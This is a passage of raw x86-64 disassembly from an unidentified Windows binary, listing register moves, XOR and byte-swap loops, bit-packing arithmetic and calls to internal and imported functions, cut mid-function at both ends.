   14004d29b:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   14004d2a2:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   14004d2a9:	lea    rcx,[rbp+0x1060]
   14004d2b0:	mov    rdx,rsi
   14004d2b3:	call   0x14003c0b8
   14004d2b8:	test   rbx,rbx
   14004d2bb:	je     0x14004d309
   14004d2bd:	mov    rcx,rax
   14004d2c0:	mov    r8,rdx
   14004d2c3:	mov    rax,rdx
   14004d2c6:	add    rax,rdi
   14004d2c9:	mov    r9,QWORD PTR [rbp+0x830]
   14004d2d0:	cmp    rax,rbx
   14004d2d3:	jbe    0x14004d2f3
   14004d2d5:	xor    r10d,r10d
   14004d2d8:	cmp    r8,r10
   14004d2db:	je     0x14004d309
   14004d2dd:	lea    rax,[r10+rdi*1]
   14004d2e1:	xor    edx,edx
   14004d2e3:	div    rbx
   14004d2e6:	mov    al,BYTE PTR [r9+rdx*1]
   14004d2ea:	mov    BYTE PTR [rcx+r10*1],al
   14004d2ee:	inc    r10
   14004d2f1:	jmp    0x14004d2d8
   14004d2f3:	add    r9,rdi
   14004d2f6:	xor    eax,eax
   14004d2f8:	cmp    r8,rax
   14004d2fb:	je     0x14004d309
   14004d2fd:	mov    dl,BYTE PTR [r9+rax*1]
   14004d301:	mov    BYTE PTR [rcx+rax*1],dl
   14004d304:	inc    rax
   14004d307:	jmp    0x14004d2f8
   14004d309:	mov    rcx,QWORD PTR [rbp+0x7e8]
   14004d310:	xor    eax,eax
   14004d312:	cmp    rsi,rax
   14004d315:	je     0x14004d343
   14004d317:	cmp    rcx,0x3f
   14004d31b:	ja     0x140059d8e
   14004d321:	mov    edx,eax
   14004d323:	and    edx,0x7
   14004d326:	mov    dl,BYTE PTR [rbp+rdx*1+0xf80]
   14004d32d:	xor    dl,BYTE PTR [rbp+rax*1+0x1060]
   14004d334:	inc    rax
   14004d337:	mov    BYTE PTR [rbp+rcx*1+0x500],dl
   14004d33e:	inc    rcx
   14004d341:	jmp    0x14004d312
   14004d343:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   14004d34a:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   14004d351:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   14004d358:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   14004d35f:	xor    eax,eax
   14004d361:	cmp    rax,0x40
   14004d365:	je     0x14004d37d
   14004d367:	mov    ecx,DWORD PTR [rbp+rax*1+0x500]
   14004d36e:	bswap  ecx
   14004d370:	mov    DWORD PTR [rbp+rax*1+0xf80],ecx
   14004d377:	add    rax,0x4
   14004d37b:	jmp    0x14004d361
   14004d37d:	movups xmm0,XMMWORD PTR [rbp+0x848]
   14004d384:	mov    eax,DWORD PTR [rbp+0x858]
   14004d38a:	movups XMMWORD PTR [rbp+0x1060],xmm0
   14004d391:	mov    DWORD PTR [rbp+0x1070],eax
   14004d397:	and    DWORD PTR [rbp+0x1074],0x0
   14004d39e:	movaps xmm0,XMMWORD PTR [rbp+0xf80]
   14004d3a5:	movaps xmm1,XMMWORD PTR [rbp+0xf90]
   14004d3ac:	movaps xmm2,XMMWORD PTR [rbp+0xfa0]
   14004d3b3:	movaps xmm3,XMMWORD PTR [rbp+0xfb0]
   14004d3ba:	lea    rax,[rbp+0x1078]
   14004d3c1:	movups XMMWORD PTR [rax+0x30],xmm3
   14004d3c5:	movups XMMWORD PTR [rax+0x20],xmm2
   14004d3c9:	movups XMMWORD PTR [rax+0x10],xmm1
   14004d3cd:	movups XMMWORD PTR [rax],xmm0
   14004d3d0:	call   0x140064214
   14004d3d5:	mov    al,BYTE PTR [rip+0x4b6b2]        # 0x140098a8d
   14004d3db:	cmp    al,0x1
   14004d3dd:	je     0x14004d426
   14004d3df:	movzx  eax,al
   14004d3e2:	cmp    eax,0x2
   14004d3e5:	je     0x14004d4cc
   14004d3eb:	and    DWORD PTR [rbp+0xcc0],0x0
   14004d3f2:	lea    rcx,[rip+0xfffffffffffb3c87]        # 0x140001080
   14004d3f9:	mov    rdx,QWORD PTR [rbp+0x1150]
   14004d400:	push   0x40
   14004d402:	pop    r8
   14004d404:	lea    r9,[rbp+0xcc0]
   14004d40b:	call   QWORD PTR [rip+0x473f7]        # 0x140094808
   14004d411:	test   eax,eax
   14004d413:	sete   cl
   14004d416:	inc    cl
   14004d418:	mov    BYTE PTR [rip+0x4b66f],cl        # 0x140098a8d
   14004d41e:	test   eax,eax
   14004d420:	je     0x14004d4cc
   14004d426:	mov    al,BYTE PTR [rip+0x4b78c]        # 0x140098bb8
   14004d42c:	cmp    al,0x1
   14004d42e:	je     0x14004d453
   14004d430:	movzx  eax,al
   14004d433:	test   eax,eax
   14004d435:	jne    0x14004d4cc
   14004d43b:	call   0x140065d51
   14004d440:	test   rax,rax
   14004d443:	sete   cl
   14004d446:	inc    cl
   14004d448:	mov    BYTE PTR [rip+0x4b76a],cl        # 0x140098bb8
   14004d44e:	test   rax,rax
   14004d451:	je     0x14004d4cc
   14004d453:	call   0x140064227
   14004d458:	mov    eax,0xc8c291de
   14004d45d:	xchg   DWORD PTR [rip+0x4b67d],eax        # 0x140098ae0
   14004d463:	call   QWORD PTR [rip+0x471e7]        # 0x140094650
   14004d469:	mov    eax,eax
   14004d46b:	mov    QWORD PTR [rip+0x4ab8e],rax        # 0x140098000
   14004d472:	lea    rcx,[rbp+0x1060]
   14004d479:	push   0xffffffffffffffff
   14004d47b:	pop    rdx
   14004d47c:	call   0x14002b840
   14004d481:	xor    eax,eax
   14004d483:	xchg   DWORD PTR [rip+0x4b657],eax        # 0x140098ae0
   14004d489:	mov    BYTE PTR [rip+0x4b5fe],0x0        # 0x140098a8e
   14004d490:	mov    eax,DWORD PTR [rbp+0x1060]
   14004d496:	add    DWORD PTR [rbp+0x848],eax
   14004d49c:	mov    eax,DWORD PTR [rbp+0x1064]
   14004d4a2:	add    DWORD PTR [rbp+0x84c],eax
   14004d4a8:	mov    eax,DWORD PTR [rbp+0x1068]
   14004d4ae:	add    DWORD PTR [rbp+0x850],eax
   14004d4b4:	mov    eax,DWORD PTR [rbp+0x106c]
   14004d4ba:	add    DWORD PTR [rbp+0x854],eax
   14004d4c0:	mov    eax,DWORD PTR [rbp+0x1070]
   14004d4c6:	add    DWORD PTR [rbp+0x858],eax
   14004d4cc:	mov    BYTE PTR [rip+0x4b5b9],0x0        # 0x140098a8c
   14004d4d3:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   14004d4da:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   14004d4e1:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   14004d4e8:	xor    eax,eax
   14004d4ea:	cmp    rax,0x14
   14004d4ee:	je     0x14004d506
   14004d4f0:	mov    ecx,DWORD PTR [rbp+rax*1+0x848]
   14004d4f7:	bswap  ecx
   14004d4f9:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   14004d500:	add    rax,0x4
   14004d504:	jmp    0x14004d4ea
   14004d506:	mov    rsi,QWORD PTR [rbp+0x7e0]
   14004d50d:	mov    eax,r13d
   14004d510:	shr    eax,0x3
   14004d513:	and    eax,0x1f
   14004d516:	lea    rcx,[rax+rbp*1]
   14004d51a:	add    rcx,0x1060
   14004d521:	xor    r8d,r8d
   14004d524:	xor    edx,edx
   14004d526:	xor    eax,eax
   14004d528:	cmp    r8,0x10
   14004d52c:	je     0x14004d547
   14004d52e:	shld   rax,rdx,0x8
   14004d533:	mov    r9,rdx
   14004d536:	shl    r9,0x8
   14004d53a:	movzx  edx,BYTE PTR [rcx+r8*1]
   14004d53f:	inc    r8
   14004d542:	or     rdx,r9
   14004d545:	jmp    0x14004d528
   14004d547:	push   0xffffffffffffffff
   14004d549:	pop    r8
   14004d54b:	mov    r9,r8
   14004d54e:	mov    ecx,esi
   14004d550:	shl    r9,cl
   14004d553:	cmp    rsi,0x40
   14004d557:	not    r9
   14004d55a:	cmovae r9,r8
   14004d55e:	and    r13d,0x7
   14004d562:	lea    ecx,[rsi+r13*1]
   14004d566:	neg    cl
   14004d568:	shrd   rdx,rax,cl
   14004d56c:	shr    rax,cl
   14004d56f:	test   cl,0x40
   14004d572:	cmove  rax,rdx
   14004d576:	and    rax,r9
   14004d579:	mov    rbx,QWORD PTR [rbp+0x820]
   14004d580:	lea    r10,[rsi+0x7]
   14004d584:	bswap  rax
   14004d587:	shr    r10,0x3
   14004d58b:	mov    QWORD PTR [rbp+0xf80],rax
   14004d592:	mov    r8,rbx
   14004d595:	imul   r8,r10
   14004d599:	push   0x8
   14004d59b:	pop    rcx
   14004d59c:	sub    rcx,r10
   14004d59f:	dec    r10
   14004d5a2:	mov    rax,QWORD PTR [rbp+0x1158]
   14004d5a9:	lea    r11,[rax+r8*1]
   14004d5ad:	mov    rax,r8
   14004d5b0:	xor    edx,edx
   14004d5b2:	push   0x14
   14004d5b4:	pop    rdi
   14004d5b5:	div    rdi
   14004d5b8:	cmp    rcx,0x8
   14004d5bc:	je     0x14004d5e2
   14004d5be:	cmp    r10,0x7
   14004d5c2:	ja     0x140059d80
   14004d5c8:	imul   rax,rax,0xffffffffffffffec
   14004d5cc:	mov    al,BYTE PTR [r11+rax*1]
   14004d5d0:	xor    BYTE PTR [rbp+rcx*1+0xf80],al
   14004d5d7:	inc    rcx
   14004d5da:	inc    r11
   14004d5dd:	inc    r8
   14004d5e0:	jmp    0x14004d5ad
   14004d5e2:	mov    rdx,QWORD PTR [rbp+0xf80]
   14004d5e9:	bswap  rdx
   14004d5ec:	and    rdx,r9
   14004d5ef:	inc    rbx
   14004d5f2:	mov    QWORD PTR [rbp+0x820],rbx
   14004d5f9:	mov    rax,QWORD PTR [rbp+0x890]
   14004d600:	mov    QWORD PTR [rbp+0x1148],rax
   14004d607:	mov    rdi,QWORD PTR [rbp+0x888]
   14004d60e:	mov    r13,QWORD PTR [rbp+0x880]
   14004d615:	mov    r12,QWORD PTR [rbp+0x870]
   14004d61c:	mov    r14,QWORD PTR [rbp+0x878]
   14004d623:	mov    rax,QWORD PTR [rbp+0x1148]
   14004d62a:	sub    rax,rdi
   14004d62d:	sub    rax,r13
   14004d630:	cmp    rax,rsi
   14004d633:	cmovae rax,rsi
   14004d637:	cmp    rax,0x1
   14004d63b:	adc    rax,0x0
   14004d63f:	mov    ecx,esi
   14004d641:	sub    ecx,eax
   14004d643:	and    cl,0x3f
   14004d646:	cmp    rsi,rax
   14004d649:	movzx  ecx,cl
   14004d64c:	mov    r8d,0x0
   14004d652:	cmovbe ecx,r8d
   14004d656:	shr    rdx,cl
   14004d659:	mov    ecx,eax
   14004d65b:	shld   r14,r12,cl
   14004d65f:	shl    r12,cl
   14004d662:	test   al,0x40
   14004d664:	cmovne r14,r12
   14004d668:	mov    ecx,0x0
   14004d66d:	cmove  rcx,r12
   14004d671:	or     rcx,rdx
   14004d674:	mov    QWORD PTR [rbp+0x878],r14
   14004d67b:	mov    QWORD PTR [rbp+0x870],rcx
   14004d682:	add    r13,rax
   14004d685:	mov    QWORD PTR [rbp+0x880],r13
   14004d68c:	mov    r12,rcx
   14004d68f:	jmp    0x14004d142
   14004d694:	add    r13,0xfffffffffffffff8
   14004d698:	mov    rax,r12
   14004d69b:	mov    ecx,r13d
   14004d69e:	shrd   rax,r14,cl
   14004d6a2:	mov    rdx,r14
   14004d6a5:	shr    rdx,cl
   14004d6a8:	push   0xffffffffffffffff
   14004d6aa:	pop    r9
   14004d6ac:	mov    r8,r9
   14004d6af:	shl    r8,cl
   14004d6b2:	test   r13b,0x40
   14004d6b6:	cmove  rdx,rax
   14004d6ba:	mov    rax,r9
   14004d6bd:	cmovne rax,r8
   14004d6c1:	mov    ecx,0x0
   14004d6c6:	cmove  rcx,r8
   14004d6ca:	mov    QWORD PTR [rbp+0x880],r13
   14004d6d1:	not    rcx
   14004d6d4:	not    rax
   14004d6d7:	and    rax,r14
   14004d6da:	and    rcx,r12
   14004d6dd:	test   r13,r13
   14004d6e0:	cmove  rcx,r13
   14004d6e4:	cmove  rax,r13
   14004d6e8:	mov    QWORD PTR [rbp+0x878],rax
   14004d6ef:	mov    QWORD PTR [rbp+0x870],rcx
   14004d6f6:	add    rdi,0x8
   14004d6fa:	mov    QWORD PTR [rbp+0x888],rdi
   14004d701:	mov    r12,rcx
   14004d704:	mov    r14,rax
   14004d707:	inc    QWORD PTR [rbp+0x1160]
   14004d70e:	lea    rcx,[rbp+0x400]
   14004d715:	call   0x14003c141
   14004d71a:	jmp    0x14004d120
   14004d71f:	mov    r12,QWORD PTR [rbp+0x400]
   14004d726:	mov    r13,QWORD PTR [rbp+0x408]
   14004d72d:	mov    rdi,QWORD PTR [rbp+0x410]
   14004d734:	mov    rcx,r13
   14004d737:	mov    rdx,rdi
   14004d73a:	xor    r8d,r8d
   14004d73d:	lea    r9,[rip+0x3a8b4]        # 0x140087ff8
   14004d744:	call   0x14003c1d3
   14004d749:	movzx  ebx,BYTE PTR [rax]
   14004d74c:	mov    rcx,r13
   14004d74f:	mov    rdx,rdi
   14004d752:	push   0x1
   14004d754:	pop    r8
   14004d756:	lea    r9,[rip+0x3a8b3]        # 0x140088010
   14004d75d:	call   0x14003c1d3
   14004d762:	movzx  esi,BYTE PTR [rax]
   14004d765:	mov    rcx,r13
   14004d768:	mov    rdx,rdi
   14004d76b:	push   0x2
   14004d76d:	pop    r8
   14004d76f:	lea    r9,[rip+0x3a8b2]        # 0x140088028
   14004d776:	call   0x14003c1d3
   14004d77b:	movzx  r14d,BYTE PTR [rax]
   14004d77f:	mov    rcx,r13
   14004d782:	mov    rdx,rdi
   14004d785:	push   0x3
   14004d787:	pop    r8
   14004d789:	lea    r9,[rip+0x3a8b0]        # 0x140088040
   14004d790:	call   0x14003c1d3
   14004d795:	movzx  eax,BYTE PTR [rax]
   14004d798:	shl    eax,0x18
   14004d79b:	shl    r14d,0x10
   14004d79f:	shl    esi,0x8
   14004d7a2:	or     rsi,rbx
   14004d7a5:	or     rsi,r14
   14004d7a8:	or     rsi,rax
   14004d7ab:	mov    rcx,QWORD PTR [rbp+0xf68]
   14004d7b2:	shr    rcx,0x3
   14004d7b6:	inc    rcx
   14004d7b9:	mov    rax,rsi
   14004d7bc:	xor    edx,edx
   14004d7be:	div    rcx
   14004d7c1:	lea    rax,[rdx*8+0x20]
   14004d7c9:	mov    QWORD PTR [rbp+0x890],rax
   14004d7d0:	mov    QWORD PTR [rbp+0x810],rdx
   14004d7d7:	mov    ecx,0xc8
   14004d7dc:	lea    rbx,[rbp+0x1060]
   14004d7e3:	mov    rdi,rbx
   14004d7e6:	lea    rsi,[rbp+0x7d8]
   14004d7ed:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   14004d7ef:	mov    rcx,r12
   14004d7f2:	mov    rdx,r13
   14004d7f5:	call   0x14006f7f7
   14004d7fa:	lea    rax,[r15+0x10]
   14004d7fe:	mov    QWORD PTR [rbp+0xd10],rax
   14004d805:	mov    ecx,0xc8
   14004d80a:	lea    rdi,[rbp+0xd18]
   14004d811:	mov    rsi,rbx
   14004d814:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   14004d816:	mov    r12,QWORD PTR [rbp+0xd50]
   14004d81d:	sub    r12,0x82
   14004d824:	mov    eax,0x0
   14004d829:	cmovb  r12,rax
   14004d82d:	cmp    r12,0x1
   14004d831:	mov    QWORD PTR [rbp+0xf70],r12
   14004d838:	adc    r12,0x0
   14004d83c:	mov    QWORD PTR [rbp+0x700],r12
   14004d843:	shr    r12,0x4
   14004d847:	cmp    r12,0x1
   14004d84b:	adc    r12,0x0
   14004d84f:	lea    rcx,[rbp+0x500]
   14004d856:	push   0x40
   14004d858:	pop    rdx
   14004d859:	call   0x14003c111
   14004d85e:	xor    ebx,ebx
   14004d860:	cmp    rbx,0x40
   14004d864:	je     0x14004de74
   14004d86a:	mov    r8,QWORD PTR [rbp+0xdc8]
   14004d871:	mov    r9,QWORD PTR [rbp+0xdd0]
   14004d878:	lea    rax,[r8+0x8]
   14004d87c:	cmp    rax,r9
   14004d87f:	jbe    0x14004d888
   14004d881:	xor    edx,edx
   14004d883:	jmp    0x14004de60
   14004d888:	mov    rax,QWORD PTR [rbp+0xdc0]
   14004d88f:	cmp    rax,0x8
   14004d893:	jae    0x14004ddec
   14004d899:	mov    rcx,QWORD PTR [rbp+0xd60]
   14004d8a0:	cmp    rcx,QWORD PTR [rbp+0xd68]
   14004d8a7:	jae    0x14004d8ed
   14004d8a9:	mov    rcx,QWORD PTR [rbp+0xd18]
   14004d8b0:	mov    rdx,QWORD PTR [rbp+0xd58]
   14004d8b7:	cmp    rdx,rcx
   14004d8ba:	jae    0x14004d8ed
   14004d8bc:	lea    rax,[r15+0x10]
   14004d8c0:	movzx  r13d,BYTE PTR [rax+rdx*1]
   14004d8c5:	and    r13d,0x7f
   14004d8c9:	lea    rax,[rdx+0x1]
   14004d8cd:	cmp    rax,rcx
   14004d8d0:	jae    0x14004d8fb
   14004d8d2:	movzx  r8d,BYTE PTR [r15+rdx*1+0x11]
   14004d8d8:	test   r8b,r8b
   14004d8db:	jns    0x14004d8f5
   14004d8dd:	shl    r13,0x7
   14004d8e1:	and    r8d,0x7f
   14004d8e5:	or     r13,r8
   14004d8e8:	mov    rdx,rax
   14004d8eb:	jmp    0x14004d8c9
   14004d8ed:	xor    r11d,r11d
   14004d8f0:	jmp    0x14004dd68
   14004d8f5:	inc    rdx
   14004d8f8:	mov    rcx,rdx
   14004d8fb:	mov    QWORD PTR [rbp+0xd58],rcx
   14004d902:	mov    rax,r13
   14004d905:	shr    rax,0x8
   14004d909:	mov    rsi,r13
   14004d90c:	shr    rsi,0x28
   14004d910:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   14004d917:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   14004d91e:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   14004d925:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   14004d92c:	mov    DWORD PTR [rbp+0x7d0],eax
   14004d932:	lea    rax,[rip+0x3a71f]        # 0x140088058
   14004d939:	mov    QWORD PTR [rsp+0x20],rax
   14004d93e:	lea    rcx,[rbp+0xf80]
   14004d945:	push   0x4
   14004d947:	pop    rdx
   14004d948:	lea    r8,[rbp+0x7d0]
   14004d94f:	mov    r9,rdx
   14004d952:	call   0x1400638fe
   14004d957:	mov    BYTE PTR [rbp+0xf84],sil
   14004d95e:	mov    rsi,QWORD PTR [rbp+0xd30]
   14004d965:	cmp    QWORD PTR [rbp+0xd78],rsi
   14004d96c:	jbe    0x14004da9c
   14004d972:	mov    r9,QWORD PTR [rbp+0xd38]
   14004d979:	cmp    r9,0x4
   14004d97d:	ja     0x140059d9c
   14004d983:	mov    rcx,QWORD PTR [rbp+0xd40]
   14004d98a:	cmp    rcx,0x5
   14004d98e:	jae    0x140059dae
   14004d994:	mov    r8,QWORD PTR [rbp+0xd78]
   14004d99b:	cmp    r8,rsi
   14004d99e:	je     0x140059dbc
   14004d9a4:	mov    eax,DWORD PTR [rbp+rcx*4+0xd88]
   14004d9ab:	mov    cl,BYTE PTR [rbp+0xd48]
   14004d9b1:	rol    eax,cl
   14004d9b3:	sub    r8,rsi
   14004d9b6:	xor    eax,DWORD PTR [rbp+r9*4+0xd88]
   14004d9be:	xor    edx,edx
   14004d9c0:	div    r8
   14004d9c3:	mov    rdi,rdx
   14004d9c6:	mov    rax,QWORD PTR [rbp+0xd80]
   14004d9cd:	mov    QWORD PTR [rbp+0x1060],rax
   14004d9d4:	cmp    rsi,0x40
   14004d9d8:	push   0x40
   14004d9da:	pop    rax
   14004d9db:	cmovae rsi,rax
   14004d9df:	movaps XMMWORD PTR [rbp+0x800],xmm7
   14004d9e6:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14004d9ed:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   14004d9f4:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14004d9fb:	lea    rcx,[rbp+0x7d0]
   14004da02:	mov    rdx,rsi
   14004da05:	call   0x14003c0b8
   14004da0a:	mov    r10,QWORD PTR [rbp+0xd78]
   14004da11:	test   r10,r10
   14004da14:	je     0x14004da62
   14004da16:	mov    rcx,rax
   14004da19:	mov    r8,rdx
   14004da1c:	mov    rax,rdx
   14004da1f:	add    rax,rdi
   14004da22:	mov    r9,QWORD PTR [rbp+0xd70]
   14004da29:	cmp    rax,r10
   14004da2c:	jbe    0x14004da4c
   14004da2e:	xor    r11d,r11d
   14004da31:	cmp    r8,r11
   14004da34:	je     0x14004da62
   14004da36:	lea    rax,[r11+rdi*1]
   14004da3a:	xor    edx,edx
   14004da3c:	div    r10
   14004da3f:	mov    al,BYTE PTR [r9+rdx*1]
   14004da43:	mov    BYTE PTR [rcx+r11*1],al
   14004da47:	inc    r11
   14004da4a:	jmp    0x14004da31
   14004da4c:	add    r9,rdi
   14004da4f:	xor    eax,eax
   14004da51:	cmp    r8,rax
   14004da54:	je     0x14004da62
   14004da56:	mov    dl,BYTE PTR [r9+rax*1]
   14004da5a:	mov    BYTE PTR [rcx+rax*1],dl
   14004da5d:	inc    rax
   14004da60:	jmp    0x14004da51
   14004da62:	mov    rcx,QWORD PTR [rbp+0xd28]
   14004da69:	xor    eax,eax
   14004da6b:	cmp    rsi,rax
   14004da6e:	je     0x14004da9c
   14004da70:	cmp    rcx,0x3f
   14004da74:	ja     0x140059d8e
   14004da7a:	mov    edx,eax
   14004da7c:	and    edx,0x7
   14004da7f:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   14004da86:	xor    dl,BYTE PTR [rbp+rax*1+0x7d0]
   14004da8d:	inc    rax
   14004da90:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   14004da97:	inc    rcx
   14004da9a:	jmp    0x14004da6b
   14004da9c:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   14004daa3:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   14004daaa:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   14004dab1:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   14004dab8:	xor    eax,eax
   14004daba:	cmp    rax,0x40
   14004dabe:	je     0x14004dad6
   14004dac0:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   14004dac7:	bswap  ecx
   14004dac9:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   14004dad0:	add    rax,0x4
   14004dad4:	jmp    0x14004daba
   14004dad6:	movups xmm0,XMMWORD PTR [rbp+0xd88]
   14004dadd:	mov    eax,DWORD PTR [rbp+0xd98]
   14004dae3:	movups XMMWORD PTR [rbp+0x7d0],xmm0
   14004daea:	mov    DWORD PTR [rbp+0x7e0],eax
   14004daf0:	and    DWORD PTR [rbp+0x7e4],0x0
   14004daf7:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   14004dafe:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   14004db05:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   14004db0c:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   14004db13:	lea    rax,[rbp+0x7e8]
   14004db1a:	movups XMMWORD PTR [rax+0x30],xmm3
   14004db1e:	movups XMMWORD PTR [rax+0x20],xmm2
   14004db22:	movups XMMWORD PTR [rax+0x10],xmm1
   14004db26:	movups XMMWORD PTR [rax],xmm0
   14004db29:	call   0x140064214
   14004db2e:	mov    al,BYTE PTR [rip+0x4af59]        # 0x140098a8d
   14004db34:	cmp    al,0x1
   14004db36:	je     0x14004db7f
   14004db38:	movzx  eax,al
   14004db3b:	cmp    eax,0x2
   14004db3e:	je     0x14004dc25
   14004db44:	and    DWORD PTR [rbp+0x400],0x0
   14004db4b:	lea    rcx,[rip+0xfffffffffffb352e]        # 0x140001080
   14004db52:	mov    rdx,QWORD PTR [rbp+0x1150]
   14004db59:	push   0x40
   14004db5b:	pop    r8
   14004db5d:	lea    r9,[rbp+0x400]
   14004db64:	call   QWORD PTR [rip+0x46c9e]        # 0x140094808
   14004db6a:	test   eax,eax
   14004db6c:	sete   cl
   14004db6f:	inc    cl
   14004db71:	mov    BYTE PTR [rip+0x4af16],cl        # 0x140098a8d
   14004db77:	test   eax,eax
   14004db79:	je     0x14004dc25
   14004db7f:	mov    al,BYTE PTR [rip+0x4b033]        # 0x140098bb8
   14004db85:	cmp    al,0x1
   14004db87:	je     0x14004dbac
   14004db89:	movzx  eax,al
   14004db8c:	test   eax,eax
   14004db8e:	jne    0x14004dc25
   14004db94:	call   0x140065d51
   14004db99:	test   rax,rax
   14004db9c:	sete   cl
   14004db9f:	inc    cl
   14004dba1:	mov    BYTE PTR [rip+0x4b011],cl        # 0x140098bb8
   14004dba7:	test   rax,rax
   14004dbaa:	je     0x14004dc25
   14004dbac:	call   0x140064227
   14004dbb1:	mov    eax,0xc8c291de
   14004dbb6:	xchg   DWORD PTR [rip+0x4af24],eax        # 0x140098ae0
   14004dbbc:	call   QWORD PTR [rip+0x46a8e]        # 0x140094650
   14004dbc2:	mov    eax,eax
   14004dbc4:	mov    QWORD PTR [rip+0x4a435],rax        # 0x140098000
   14004dbcb:	lea    rcx,[rbp+0x7d0]
   14004dbd2:	push   0xffffffffffffffff
   14004dbd4:	pop    rdx
   14004dbd5:	call   0x14002b840
   14004dbda:	xor    eax,eax
   14004dbdc:	xchg   DWORD PTR [rip+0x4aefe],eax        # 0x140098ae0
   14004dbe2:	mov    BYTE PTR [rip+0x4aea5],0x0        # 0x140098a8e
   14004dbe9:	mov    eax,DWORD PTR [rbp+0x7d0]
   14004dbef:	add    DWORD PTR [rbp+0xd88],eax
   14004dbf5:	mov    eax,DWORD PTR [rbp+0x7d4]
   14004dbfb:	add    DWORD PTR [rbp+0xd8c],eax
   14004dc01:	mov    eax,DWORD PTR [rbp+0x7d8]
   14004dc07:	add    DWORD PTR [rbp+0xd90],eax
   14004dc0d:	mov    eax,DWORD PTR [rbp+0x7dc]
   14004dc13:	add    DWORD PTR [rbp+0xd94],eax
   14004dc19:	mov    eax,DWORD PTR [rbp+0x7e0]
   14004dc1f:	add    DWORD PTR [rbp+0xd98],eax
   14004dc25:	mov    BYTE PTR [rip+0x4ae60],0x0        # 0x140098a8c
   14004dc2c:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14004dc33:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   14004dc3a:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14004dc41:	xor    eax,eax
   14004dc43:	cmp    rax,0x14
   14004dc47:	je     0x14004dc5f
   14004dc49:	mov    ecx,DWORD PTR [rbp+rax*1+0xd88]
   14004dc50:	bswap  ecx
   14004dc52:	mov    DWORD PTR [rbp+rax*1+0x7d0],ecx
   14004dc59:	add    rax,0x4
   14004dc5d:	jmp    0x14004dc43
   14004dc5f:	mov    r8,QWORD PTR [rbp+0xd20]
   14004dc66:	mov    eax,r13d
   14004dc69:	shr    eax,0x3
   14004dc6c:	and    eax,0x1f
   14004dc6f:	lea    rcx,[rax+rbp*1]
   14004dc73:	add    rcx,0x7d0
   14004dc7a:	xor    r9d,r9d
   14004dc7d:	xor    edx,edx
   14004dc7f:	xor    eax,eax
   14004dc81:	cmp    r9,0x10
   14004dc85:	je     0x14004dca0
   14004dc87:	shld   rax,rdx,0x8
   14004dc8c:	mov    r10,rdx
   14004dc8f:	shl    r10,0x8
   14004dc93:	movzx  edx,BYTE PTR [rcx+r9*1]
   14004dc98:	inc    r9
   14004dc9b:	or     rdx,r10
   14004dc9e:	jmp    0x14004dc81
   14004dca0:	push   0xffffffffffffffff
   14004dca2:	pop    r9
   14004dca4:	mov    r10,r9
   14004dca7:	mov    ecx,r8d
   14004dcaa:	shl    r10,cl
   14004dcad:	cmp    r8,0x40
   14004dcb1:	not    r10
   14004dcb4:	cmovae r10,r9
   14004dcb8:	and    r13d,0x7
   14004dcbc:	lea    ecx,[r8+r13*1]
   14004dcc0:	neg    cl
   14004dcc2:	shrd   rdx,rax,cl
   14004dcc6:	shr    rax,cl
   14004dcc9:	test   cl,0x40
   14004dccc:	cmove  rax,rdx
   14004dcd0:	and    rax,r10
   14004dcd3:	mov    rsi,QWORD PTR [rbp+0xd60]
   14004dcda:	add    r8,0x7
   14004dcde:	bswap  rax
   14004dce1:	shr    r8,0x3
   14004dce5:	mov    QWORD PTR [rbp+0x1060],rax
   14004dcec:	mov    r9,rsi
   14004dcef:	imul   r9,r8
   14004dcf3:	push   0x8
   14004dcf5:	pop    rcx
   14004dcf6:	sub    rcx,r8
   14004dcf9:	dec    r8
   14004dcfc:	mov    rax,QWORD PTR [rbp+0x1168]
   14004dd03:	lea    r11,[rax+r9*1]
   14004dd07:	mov    rax,r9
   14004dd0a:	xor    edx,edx
   14004dd0c:	push   0x14
   14004dd0e:	pop    rdi
   14004dd0f:	div    rdi
   14004dd12:	cmp    rcx,0x8
   14004dd16:	je     0x14004dd3c
   14004dd18:	cmp    r8,0x7
   14004dd1c:	ja     0x140059d80
   14004dd22:	imul   rax,rax,0xffffffffffffffec
   14004dd26:	mov    al,BYTE PTR [r11+rax*1]
   14004dd2a:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   14004dd31:	inc    rcx
   14004dd34:	inc    r11
   14004dd37:	inc    r9
   14004dd3a:	jmp    0x14004dd07
   14004dd3c:	mov    r11,QWORD PTR [rbp+0x1060]
   14004dd43:	bswap  r11
   14004dd46:	and    r11,r10
   14004dd49:	inc    rsi
   14004dd4c:	mov    QWORD PTR [rbp+0xd60],rsi
   14004dd53:	mov    r9,QWORD PTR [rbp+0xdd0]
   14004dd5a:	mov    rax,QWORD PTR [rbp+0xdc0]
   14004dd61:	mov    r8,QWORD PTR [rbp+0xdc8]
   14004dd68:	mov    rdx,r9
   14004dd6b:	sub    rdx,r8
